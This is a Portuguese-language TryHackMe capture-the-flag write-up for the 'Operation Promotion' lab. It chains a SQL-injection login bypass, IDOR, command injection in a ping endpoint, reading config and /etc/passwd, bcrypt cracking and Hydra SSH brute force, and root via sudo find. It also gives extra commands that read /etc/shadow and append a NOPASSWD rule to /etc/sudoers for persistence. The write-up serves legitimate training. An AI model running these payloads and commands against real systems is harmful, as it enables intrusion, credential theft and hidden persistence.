# 🎯 TryHackMe — Operation Promotion

> **Writeup de CTF da plataforma TryHackMe.**
> Documento com fins **exclusivamente educacionais**. Técnicas aplicadas em ambiente controlado e autorizado.
> Use este material apenas para estudo. Testar sistemas sem autorização é crime.

---

## 📖 Sumário

- [Visão Geral](#-visão-geral)
- [Reconhecimento](#-reconhecimento)
- [Enumeração Web](#-enumeração-web)
- [SQL Injection no Login](#-sql-injection-no-login)
- [IDOR & Command Injection](#-idor--command-injection)
- [Coleta de Credenciais](#-coleta-de-credenciais)
- [Quebra do Hash Bcrypt](#-quebra-do-hash-bcrypt)
- [Acesso SSH](#-acesso-ssh)
- [Escalação de Privilégios](#-escalação-de-privilégios)
- [Flag](#-flag)
- [Lições Aprendidas](#-lições-aprendidas)
- [Ferramentas Utilizadas](#-ferramentas-utilizadas)
- [Disclaimer](#️-disclaimer)

---

## 🧭 Visão Geral

| Campo | Valor |
|:------|:------|
| **Máquina** | Operation Promotion |
| **Plataforma** | TryHackMe |
| **IP Alvo** | `<***.**.**.*>` |
| **Hostname** | `recruitcorp` |
| **Sistema Operacional** | Ubuntu (Linux) |
| **Dificuldade** | Easy |
| **Objetivo** | Obter acesso root e capturar as flags |

A máquina simula o ambiente da empresa fictícia **RecruitCorp**, com uma aplicação web vulnerável e acesso SSH exposto. O caminho de exploração combina falhas clássicas de aplicação web com más práticas de configuração de sistema operacional, culminando em escalação de privilégio trivial via `sudo find`.

**Cadeia de ataque resumida:**

```
SQLi (login) ─▶ Admin Panel ─▶ IDOR ─▶ Command Injection ─▶ RCE (www-data)
                                                              │
                         Leak de credenciais (db.conf) ◀──────┘
                                      │
                         Bcrypt + Hydra (SSH) ─▶ jford
                                      │
                         sudo NOPASSWD find ─▶ ROOT
                                      │
                                   🏁 flag
```

---

## 🔎 Reconhecimento

### Varredura de portas

```bash
nmap -sV -sC <***.***.**.*>
```

**Resultado:**

```text
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.58 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
```

**Observações:**

- **22/tcp** — SSH aberto; alvo provável para reuso de credenciais.
- **80/tcp** — Servidor Apache com a aplicação web "RecruitCorp".
- **139/445** — Samba (não explorado nesta rota, mas vale reconhecimento com `smbclient -L //IP` e `enum4linux`).

### Enumeração de diretórios

```bash
gobuster dir -u http://<***.**.**.**>:80 \
  -w ~/Desktop/Pentest/SecLists/Discovery/Web-Content/common.txt \
  -x .php,zip
```

**Descobertas:**

| Caminho | Status | Observação |
|:--|:--|:--|
| `/admin` | 301 | Painel administrativo |
| `/robots.txt` | 200 | Possível vazamento de paths |

---

## 🌐 Enumeração Web

Ao acessar `http://10.67.181.142/admin/`, deparamo-nos com uma tela de login administrativa.

**Teste manual de SQL Injection:**

```text
Usuário: admin'-- -
Senha:   qualquer_coisa
```
**Outros payload funcionais:**
```text
• ' OR 1=1--
• ' OR '1'='1
• admin' --
• admin' #
• admin'/*
```

✅ **A aplicação é vulnerável a SQL Injection no formulário de login**, permitindo bypass completo da autenticação.

Dentro do painel, encontramos a funcionalidade **"User Lookup Record"**, acessível via `/admin/users/lookup.php?id=<id>`.

Iterando sobre o parâmetro `id`, o registro especial `id=7` revela um endpoint de diagnóstico:

```text
/admin/sysmaint-checks/ping.php
```

Um utilitário que executa `ping` internamente — **forte candidato a Command Injection**.

---

## 💉 SQL Injection no Login

O bypass via SQLi foi o **ponto de entrada** da aplicação. Utilizando o clássico `admin'-- -`, foi possível obter sessão como administrador sem conhecer a senha original.

```sql
-- Payload efetivo no campo usuário
admin'-- -
```

**Por que funciona:** o `--` comenta o restante da query, eliminando a verificação de senha. A query provavelmente é algo como:

```sql
SELECT * FROM users WHERE username = 'admin'-- -' AND password = '...';
```

Após o `--`, tudo após é ignorado, e a consulta retorna o usuário `admin`.

**Impacto:** acesso total ao painel administrativo, expondo funcionalidades internas de gerenciamento.

---

## 🎣 IDOR & Command Injection

### IDOR (Insecure Direct Object Reference)

O endpoint de lookup permitia acessar registros alterando o `id` na URL, sem verificação de autorização por objeto:

```text
/admin/users/lookup.php?id=1
/admin/users/lookup.php?id=2
...
/admin/users/lookup.php?id=7
```

Isso é um **IDOR clássico** — a aplicação autentica o usuário, mas não autoriza cada objeto individualmente.

### Command Injection

O endpoint `ping.php` recebe o parâmetro `host` e o concatena em um comando do sistema:

```bash
ping -c 1 $host
```

**Teste de injeção com `;`:**

```text
http://**.**.***.***/admin/sysmaint-checks/ping.php?host=120.0.0.1;id
```

**Resposta:**

```text
PING 120.0.0.1 (120.0.0.1) 56(84) bytes of data.
--- 120.0.0.1 ping statistics ---
1 packets transmitted, 0 received, 100% packet loss, time 0ms

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

✅ **Confirmação de RCE (Remote Code Execution)** como usuário `www-data`.

> 💡 **Nota sobre o WAF:** a aplicação bloqueia `127.0.0.1` no parâmetro `host` (retorna `Forbidden.`), mas aceita outros IPs como `120.0.0.1`. Também é preciso enviar User-Agent de navegador (`-A "Mozilla/5.0 ..."`) e o cookie `PHPSESSID` válido quando usando `curl`. Pelo navegador, com sessão ativa, funciona direto.

### Enumeração de arquivos via RCE

Com o RCE confirmado, exploramos o sistema de arquivos:

```text
?host=120.0.0.1;ls -la /var/www/html
?host=120.0.0.1;ls -la /var/www/html/admin
?host=120.0.0.1;cat /etc/passwd
?host=120.0.0.1;cat /var/www/html/config/db.conf
```

**Estrutura do webroot descoberta:**

```text
/var/www/html/
├── admin/
│   ├── dashboard.php
│   ├── index.php
│   ├── logout.php
│   ├── sysmaint-checks/
│   │   └── ping.php
│   └── users/
│       └── lookup.php
├── config/
│   └── db.conf
├── index.php
├── robots.txt
└── style.css
```

---

## 🔑 Coleta de Credenciais

Lendo o arquivo de configuração da aplicação:

```text
?host=120.0.0.1;cat /var/www/html/config/db.conf
```

**Conteúdo:**

```ini
# RecruitCorp application database config
# Pulled out of source control - DO NOT COMMIT.
db_host=localhost
db_name=<*******>
db_user=<****>
db_pass_hash=<************************************************>
db_engine=<*****>
```

Descobrimos:

- **Usuário:** `jford`
- **Hash da senha:** `$2b$10$...` — identificado como **bcrypt** (`$2b$`, cost 10)

### Sobre o hash

| Propriedade | Valor |
|:--|:--|
| Algoritmo | bcrypt |
| Variante | `$2b$` (bugfix) |
| Cost | 10 (2¹⁰ = 1024 rounds) |
| Tamanho | 60 caracteres |
| Hashcat mode | 3200 |
| John format | `bcrypt` |

Bcrypt é **lento por design** — brute force direto em wordlist grande é inviável em CPU. Com GPU, também é limitado (~500 hashes/s em placas boas).

---

## 🔨 Quebra do Hash Bcrypt

### Tentativa direta com rockyou

```bash
john --format=bcrypt \
  --wordlist=~/Desktop/Pentest/Recon/SecLists/Passwords/Leaked-Databases/rockyou.txt \
  hash.txt
```

❌ **Sem resultado.** O hash não estava no rockyou puro.

### Estratégia baseada em contexto

A página inicial anunciava uma **"Campanha de Contratação de Primavera 2026"**. Base derivada: **`spring2026`**. Em CTFs, contexto do site quase sempre é a pista para a senha.

### Ataque com regras (wordlist mutation)

```bash
echo "spring2026" > test.txt
hashcat --stdout test.txt \
  -r /opt/homebrew/Cellar/hashcat/8.0.0/share/hashcat/rules/dive.rule \
  > senha.txt
```

O `dive.rule` gera mutações (adição de caracteres, capitalização, etc.) — uma pequena wordlist personalizada com **98.584 variações**.

### Ataque de força bruta SSH com Hydra

```bash
hydra -l <****> -P senha.txt <**.**.**.***> ssh
```

**Resultado:**

```text
[22][ssh] host: <**.**.***.***>   login: <****>   password: <******>
1 of 1 target successfully completed, 1 valid password found
```

🎉 **Senha encontrada:** `spring2026!`

> 💡 A palavra `<****>` com `*` no final foi uma das mutações geradas — a escolha de senha de `<***>` era fraca e previsível, mesmo com bcrypt. O `<*>` é uma das adições mais comuns no final de senhas.

**Alternativa:** também poderia ter sido tentada com `hashcat -m 3200 senha.txt hash.txt` diretamente contra o bcrypt (mais rápido que Hydra, pois o hash fica local), mas Hydra confirma a credencial contra o serviço real.

---

## 🔐 Acesso SSH

```bash
ssh <***>@100.100.101.112
# senha: <*********>
```

```bash
jford@recruitcorp:~$ ls
user.txt
```


```bash
jford@recruitcorp:~$cat user.txt
THM{************}
```

✅ **Acesso inicial ao sistema. Flag de usuário obtida.**

---

## 🚀 Escalação de Privilégios

### Enumeração de sudoers

```bash
sudo -l
```

**Saída:**

```text
Matching Defaults entries for jford on recruitcorp:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jford may run the following commands on recruitcorp:
    (root) NOPASSWD: /usr/bin/find
```

### Análise

O binário `find` executa comandos arbitrários via `-exec`. **Com `NOPASSWD` em `find`, a escalação para root é trivial** — está documentada no [GTFOBins](https://gtfobins.github.io/gtfobins/find/).

### Exploração

```bash
sudo /usr/bin/find . -exec /bin/sh \; -quit
```

Isso abre um shell cujo EUID é `0` (root). O `-quit` faz com que o `find` encerre após executar o comando, e o `\;` encerra o `-exec`.

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

✅ **Escalação bem-sucedida para root.**

### Alternativas de exploração do `find`

Caso o `-exec` com `/bin/sh` seja filtrado, ainda há outras formas:

```bash
# Ler qualquer arquivo como root
sudo find /root -name 'flag.txt' -exec cat {} \; -quit
sudo find /etc/shadow -exec cat {} \; -quit

# Persistência (opcional em CTF)
sudo find / -exec /bin/sh -c 'echo "jford ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' \; -quit
```

---

## 🏁 Flag

```bash
# cd /root
# ls
flag.txt  snap
# cat flag.txt
THM{*************************}
```


---

## 📚 Lições Aprendidas

### Vulnerabilidades exploradas

| # | Vulnerabilidade | Impacto |
|:--|:--|:--|
| 1 | **SQL Injection** no login | Bypass de autenticação |
| 2 | **IDOR** em `/admin/users/lookup.php?id=` | Acesso a registros internos |
| 3 | **Command Injection** em `ping.php?host=` | RCE como `www-data` |
| 4 | **Credenciais em texto claro** em `db.conf` | Exposição de usuário + hash |
| 5 | **Hash bcrypt com senha fraca/previsível** | Comprometimento via regras |
| 6 | **Sudo `NOPASSWD` em `find`** | Escalação para root |

## 🛠 Ferramentas Utilizadas

| Ferramenta | Uso |
|:--|:--|
| **nmap** | Descoberta de portas e serviços |
| **gobuster** | Enumeração de diretórios web |
| **curl** | Interação com a aplicação web |
| **hashcat** | Geração de wordlist com regras |
| **john the ripper** | Identificação/quebra de hash bcrypt |
| **hydra** | Brute force SSH |
| **navegador + DevTools** | Testes manuais de SQLi, IDOR e RCE |
| **GTFOBins** | Referência para escalação via `find` |

---

<div align="center">
  <i>TryHackMe — Operation Promotion · Writeup</i><br/>
  <b>⭐⭐⭐ Se este writeup te ajudou, deixe uma estrela no repositório! ⭐⭐⭐</b>
</div>